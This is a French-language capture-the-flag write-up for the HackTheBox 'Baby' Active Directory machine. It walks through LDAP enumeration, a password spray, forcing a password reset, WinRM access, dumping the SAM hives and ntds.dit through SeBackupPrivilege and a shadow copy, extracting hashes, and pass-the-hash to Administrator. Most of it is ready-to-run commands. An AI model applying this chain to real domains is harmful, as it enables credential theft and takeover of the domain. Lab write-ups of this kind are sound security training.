# HTB Baby - User Access Writeup

## Reconnaissance Initiale
```bash
nmap -sC -sV -p- 10.129.79.38
```
SMB (139/445) et LDAP (389) ouverts. Enum4linux-ng révèle :
- Domaine : `baby.vl` / `BABY`
- DC : `BabyDC.baby.vl`
- SID : `S-1-5-21-1407081343-4001094062-1444647654`

## Énumération LDAP Anonyme
```bash
ldapsearch -x -H ldap://10.129.79.38 -b 'DC=baby,DC=vl' -s sub '(objectClass=user)' sAMAccountName
```
Extrait tous les utilisateurs. Description de **Teresa.Bell** révèle :  
`Set initial password to BabyStart123!`

## Password Spray

On tente donc un password spray mais rien de concluant.
```bash
ldapsearch -x -H ldap://10.129.79.38 -b 'DC=baby,DC=vl' -s sub '(objectClass=user)' sAMAccountName | grep '^sAMAccountName:' | awk '{print $2}' > users.txt
nxc smb 10.129.79.38 -u users.txt -p BabyStart123! --continue-on-success
```
 
## Identification Compte Expiré
En listant les users dont le password doit être reset, **Caroline.Robinson** est identifié.
```bash
ldapsearch -x -H ldap://10.129.79.38 -b 'DC=baby,DC=vl' '(sAMAccountName=Caroline.Robinson)' userAccountControl pwdLastSet
```

## Reset Password
```bash
smbpasswd -r 10.129.79.38 -U Caroline.Robinson
# Ancien: BabyStart123! → Nouveau: Ysa123456 Pour respecter la password policy
```

## Shell User
```bash
evil-winrm -i 10.129.79.38 -u 'Caroline.Robinson@baby.vl' -p 'Ysa123456'
```
**user.txt** récupéré sur `C:\Users\Caroline.Robinson\Desktop\user.txt`

## ROOT

### Énumération Initiale
```
whoami /priv
whoami /groups
```
**SeBackupPrivilege** visible, permettant de bypass les ACL sur les hives physiques.

**WinPEAS upload** pour confirmation :
```
upload /home/ys4/Downloads/winPEASx64.exe .
.\winPEASx64.exe quiet
```

### Dump SAM Hives (SeBackup)
```
mkdir C:\temp
cd C:\temp
reg save HKLM\SAM sam.hive
reg save HKLM\SYSTEM system.hive
reg save HKLM\SECURITY security.hive
```

**Exfiltration** :
```
download sam.hive
download system.hive
```

### Volume Shadow Copy (NTDS.dit)
**Script diskshadow local** :
```bash
cat > backup << 'EOF'
set verbose on
set context persistent nowriters
set metadata C:\Windows\Temp\ysa.cab
add volume c: alias ysa
create
expose %ysa% e:
EOF
unix2dos backup
upload backup
```

**Exécution** :
```powershell
diskshadow /s C:\Temp\backup
```
**E:** = copie shadow complète de C:

**Copie ntds.dit** :
```
robocopy /b E:\Windows\ntds . ntds.dit
download ntds.dit
```

### Extraction Hashes
```bash
secretsdump.py -ntds ntds.dit -system system.hive LOCAL
```
**NT hash Administrator** : `ee4457ae59f1e3fbd764e33d9cef123d`

### Pass-the-Hash Root
```bash
evil-winrm -i 10.129.79.38 -u Administrator -H ee4457ae59f1e3fbd764e33d9cef123d
```
**Shell SYSTEM obtenu** → `C:\Users\Administrator\Desktop\root.txt` ! 

### Timeline Privesc
```
SeBackupPrivilege → SAM dump → Shadow Copy → ntds.dit → PTH Admin → root.txt
```
